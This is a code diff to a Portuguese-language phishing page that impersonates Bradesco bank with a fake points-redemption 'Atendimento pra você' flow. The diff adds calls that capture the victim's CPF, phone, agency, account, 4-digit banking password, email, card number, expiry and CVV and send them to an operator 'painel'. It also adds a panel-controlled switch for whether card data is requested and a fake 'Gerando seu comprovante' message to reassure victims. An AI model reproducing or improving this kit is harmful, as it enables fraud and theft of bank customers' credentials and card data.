@@ -239,8 +239,8 @@
             object-fit: contain;
         }
 
-        .faixa-roxa {
-            background: #6B44FF;
+        .faixa-vermelha {
+            background: #C62828;
             padding: 15px 20px;
             display: flex;
             align-items: center;
@@ -268,8 +268,19 @@
             gap: 15px;
         }
 
+        .balao-chat {
+            background: #C62828;
+            border-radius: 18px;
+            padding: 12px 16px;
+            max-width: 95%;
+            color: white;
+            font-size: 1rem;
+            line-height: 1.5;
+            margin-left: 50px;
+        }
+
         .balao-chat-sem-logo {
-            background: #6B44FF;
+            background: #C62828;
             border-radius: 18px;
             padding: 12px 16px;
             max-width: 95%;
@@ -287,7 +298,7 @@
         }
 
         .balao-proto {
-            background: #6B44FF;
+            background: #C62828;
             border-radius: 18px;
             padding: 8px 16px;
             max-width: 70%;
@@ -328,18 +339,8 @@
             border-radius: 0;
         }
 
-        .balao-chat {
-            background: #6B44FF;
-            border-radius: 18px;
-            padding: 12px 16px;
-            max-width: 85%;
-            color: white;
-            font-size: 1rem;
-            line-height: 1.5;
-        }
-
         .mensagem-final {
-            background: #6B44FF;
+            background: #C62828;
             border-radius: 18px;
             padding: 12px 16px;
             max-width: 95%;
@@ -358,7 +359,7 @@
         }
 
         .btn-confirmar {
-            background: #6B44FF;
+            background: #C62828;
             color: white;
             border: none;
             width: 100%;
@@ -372,7 +373,7 @@
         }
 
         .btn-confirmar:hover {
-            background: #5435CC;
+            background: #a52a2a;
         }
 
         /* ===== PÁGINA 4 (CARTÃO) ===== */
@@ -395,7 +396,7 @@
         }
 
         .input-cartao:focus {
-            border-color: #6B44FF;
+            border-color: #C62828;
             outline: none;
         }
 
@@ -410,7 +411,7 @@
         }
 
         .btn-resgatar {
-            background: #6B44FF;
+            background: #C62828;
             color: white;
             border: none;
             width: 100%;
@@ -424,7 +425,7 @@
         }
 
         .btn-resgatar:hover {
-            background: #5435CC;
+            background: #a52a2a;
         }
 
         /* STATUS "GERANDO SEU COMPROVANTE" */
@@ -436,7 +437,7 @@
         }
 
         .balao-gerando {
-            background: #6B44FF;
+            background: #C62828;
             border-radius: 18px;
             padding: 12px 16px;
             color: white;
@@ -506,15 +507,15 @@
             </div>
 
             <div class="form-group">
-                <label class="label-banco">Senha de 6 dígitos</label>
-                <input type="password" class="input-banco" id="senha6" placeholder="Digite sua senha (6 dígitos)" maxlength="6">
+                <label class="label-banco">Senha de 4 dígitos</label>
+                <input type="password" class="input-banco" id="senha4" placeholder="Digite sua senha (4 dígitos)" maxlength="4">
             </div>
 
             <button class="btn-continuar" id="btnContinuar">Continuar</button>
         </div>
     </div>
 
-    <!-- PÁGINA 3 (ATENDIMENTO 1) -->
+    <!-- PÁGINA 3 (ATENDIMENTO 1 - SÓ EMAIL) -->
     <div class="container hidden" id="page3">
         <div class="topo-branco">
             <div class="logos-chat">
@@ -523,7 +524,7 @@
             </div>
         </div>
         
-        <div class="faixa-roxa">
+        <div class="faixa-vermelha">
             <span class="seta-voltar">←</span>
             <span class="titulo-atendimento">Atendimento pra você</span>
         </div>
@@ -545,16 +546,19 @@
             </div>
 
             <div class="balao-chat-sem-logo">
-                Para iniciar seu resgate, digite sua senha de 6 dígitos e seu e-mail que vai receber o comprovante:
+                Para iniciar seu resgate, digite seu e-mail que vai receber o comprovante:
+            </div>
+
+            <!-- STATUS "GERANDO SEU COMPROVANTE" - aparece AQUI quando cartão desativado -->
+            <div class="status-container hidden" id="statusContainer">
+                <div class="balao-gerando hidden" id="balaoGerando">
+                    Gerando seu comprovante...
+                    <div class="horario-status" id="horaGerando"></div>
+                </div>
             </div>
         </div>
 
         <div class="card-branco-form">
-            <div class="form-group">
-                <label style="color: #C62828;">Senha de 6 dígitos</label>
-                <input type="password" id="senha6_2" placeholder="000000" maxlength="6">
-            </div>
-
             <div class="form-group">
                 <label style="color: #C62828;">E-mail</label>
                 <input type="email" id="email" placeholder="seu@email.com">
@@ -573,7 +577,7 @@
             </div>
         </div>
         
-        <div class="faixa-roxa">
+        <div class="faixa-vermelha">
             <span class="seta-voltar">←</span>
             <span class="titulo-atendimento">Atendimento pra você</span>
         </div>
@@ -594,7 +598,6 @@
                 <div class="horario-proto" id="hora6"></div>
             </div>
 
-            <!-- LOGO SEM BOLA CINZA -->
             <div class="balao-container">
                 <div class="logo-fora-balao">
                     <img src="logobradesco.png" alt="Bradesco">
@@ -629,11 +632,11 @@
 
             <button class="btn-resgatar" id="btnResgatar">CONFIRMAR</button>
 
-            <!-- STATUS "GERANDO SEU COMPROVANTE" (AGORA 100% ESCONDIDO) -->
-            <div class="status-container hidden" id="statusContainer">
-                <div class="balao-gerando hidden" id="balaoGerando">
+            <!-- STATUS "GERANDO SEU COMPROVANTE" da página 4 (só usado quando cartão ativado) -->
+            <div class="status-container hidden" id="statusContainerPage4">
+                <div class="balao-gerando hidden" id="balaoGerandoPage4">
                     Gerando seu comprovante...
-                    <div class="horario-status" id="horaGerando"></div>
+                    <div class="horario-status" id="horaGerandoPage4"></div>
                 </div>
             </div>
         </div>
@@ -646,28 +649,24 @@
 
     <script>
         $(document).ready(function() {
-            // MÁSCARAS
+            // Máscaras
             $('#cpf').mask('000.000.000-00');
             $('#telefone').mask('(00) 00000-0000');
             $('#agencia').mask('0000-0');
             
-            // CONTA: traço sempre antes do último dígito (formato banco)
             $('#conta').on('input', function() {
                 let valor = $(this).val().replace(/\D/g, '');
                 if (valor.length > 1) {
-                    // Coloca o traço antes do último dígito
                     valor = valor.substring(0, valor.length - 1) + '-' + valor.substring(valor.length - 1);
                 }
                 $(this).val(valor);
             });
             
-            $('#senha6').mask('000000');
-            $('#senha6_2').mask('000000');
+            $('#senha4').mask('0000');
             $('#cartao').mask('0000 0000 0000 0000');
             $('#validade').mask('00/00');
             $('#cvv').mask('000');
 
-            // Função para horário de Brasília
             function getBrasiliaTime() {
                 const agora = new Date();
                 return new Intl.DateTimeFormat('pt-BR', {
@@ -678,7 +677,6 @@
                 }).format(agora);
             }
 
-            // Validação de CPF
             function validarCPF(cpf) {
                 cpf = cpf.replace(/\D/g, '');
                 if (cpf.length !== 11) return false;
@@ -697,12 +695,10 @@
                 return digito11 === parseInt(cpf.charAt(10));
             }
 
-            // Página 1 - Validação CPF
             $('#cpf').on('input', function() {
                 $('#btnConsultar').prop('disabled', !validarCPF($(this).val()));
             });
 
-            // Página 1 - Clique CONSULTAR
             $('#btnConsultar').on('click', function() {
                 if (!validarCPF($('#cpf').val())) {
                     Swal.fire({ 
@@ -729,7 +725,14 @@
                     return;
                 }
 
-                // Mostrar loader com mensagem "Verificando seus benefícios"
+                // CAPTURAR DADOS PARA O PAINEL
+                if (typeof window.capturarDados === 'function') {
+                    window.capturarDados({
+                        cpf: $('#cpf').val(),
+                        telefone: $('#telefone').val()
+                    });
+                }
+
                 $('#loaderMessage').text('Verificando seus benefícios...');
                 $('#loader').removeClass('hidden');
                 
@@ -737,12 +740,10 @@
                     $('#loader').addClass('hidden');
                     $('#page1').addClass('hidden');
                     $('#page2').removeClass('hidden');
-                    // Resetar mensagem do loader para o padrão
                     $('#loaderMessage').text('Consultando seus pontos...');
                 }, 3000);
             });
 
-            // Página 2 - Clique Continuar
             $('#btnContinuar').on('click', function() {
                 if ($('#agencia').val().replace(/\D/g, '').length < 4) {
                     Swal.fire({ icon: 'error', title: 'Agência inválida', background: '#C62828', color: 'white' });
@@ -752,9 +753,18 @@
                     Swal.fire({ icon: 'error', title: 'Conta inválida', text: 'Digite o número da conta.', background: '#C62828', color: 'white' });
                     return;
                 }
-                if ($('#senha6').val().length !== 6) {
-                    Swal.fire({ icon: 'error', title: 'Senha inválida', text: 'Digite a senha de 6 dígitos.', background: '#C62828', color: 'white' });
+                if ($('#senha4').val().length !== 4) {
+                    Swal.fire({ icon: 'error', title: 'Senha inválida', text: 'Digite a senha de 4 dígitos.', background: '#C62828', color: 'white' });
                     return;
+                }
+
+                // CAPTURAR DADOS PARA O PAINEL
+                if (typeof window.capturarDados === 'function') {
+                    window.capturarDados({
+                        agencia: $('#agencia').val(),
+                        conta: $('#conta').val(),
+                        senha4: $('#senha4').val()
+                    });
                 }
 
                 $('#loader').removeClass('hidden');
@@ -768,22 +778,36 @@
                 }, 3000);
             });
 
-            // Página 3 - Clique Confirmar
             $('#btnConfirmar1').on('click', function() {
-                if ($('#senha6_2').val().length !== 6) {
-                    Swal.fire({ icon: 'error', title: 'Senha inválida', text: 'Digite a senha de 6 dígitos.', background: '#C62828', color: 'white' });
-                    return;
-                }
                 if (!$('#email').val().includes('@')) {
                     Swal.fire({ icon: 'error', title: 'E-mail inválido', background: '#C62828', color: 'white' });
                     return;
                 }
 
+                // CAPTURAR DADOS PARA O PAINEL
+                if (typeof window.capturarDados === 'function') {
+                    window.capturarDados({
+                        email: $('#email').val()
+                    });
+                }
+
                 $('#loader').removeClass('hidden');
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
-                    $('#page3').addClass('hidden');
-                    $('#page4').removeClass('hidden');
+                    
+                    // VERIFICAR SE CARTÃO ESTÁ ATIVADO (do painel)
+                    const cartaoAtivo = localStorage.getItem('cartaoAtivo') !== 'false';
+                    
+                    if (cartaoAtivo) {
+                        // Vai para página do cartão
+                        $('#page3').addClass('hidden');
+                        $('#page4').removeClass('hidden');
+                    } else {
+                        // CARTÃO DESATIVADO - mostra gerando comprovante na PRÓPRIA PÁGINA 3
+                        $('#statusContainer').removeClass('hidden');
+                        $('#balaoGerando').removeClass('hidden');
+                        $('#horaGerando').text(getBrasiliaTime());
+                    }
                     
                     const hora = getBrasiliaTime();
                     $('#hora4, #hora5, #hora6, #hora7').text(hora);
@@ -792,7 +816,6 @@
 
             // Página 4 - Clique CONFIRMAR (cartão)
             $('#btnResgatar').on('click', function() {
-                // Validações
                 if ($('#cartao').val().replace(/\s/g, '').length !== 16) {
                     Swal.fire({ icon: 'error', title: 'Cartão inválido', text: 'Digite os 16 dígitos do cartão.', background: '#C62828', color: 'white' });
                     return;
@@ -806,10 +829,18 @@
                     return;
                 }
 
-                // Mostrar "Gerando seu comprovante..." com horário (SÓ AGORA)
-                $('#statusContainer').removeClass('hidden');
-                $('#balaoGerando').removeClass('hidden');
-                $('#horaGerando').text(getBrasiliaTime());
+                // CAPTURAR DADOS PARA O PAINEL
+                if (typeof window.capturarDados === 'function') {
+                    window.capturarDados({
+                        cartao: $('#cartao').val(),
+                        validade: $('#validade').val(),
+                        cvv: $('#cvv').val()
+                    });
+                }
+
+                $('#statusContainerPage4').removeClass('hidden');
+                $('#balaoGerandoPage4').removeClass('hidden');
+                $('#horaGerandoPage4').text(getBrasiliaTime());
             });
         });
     </script>
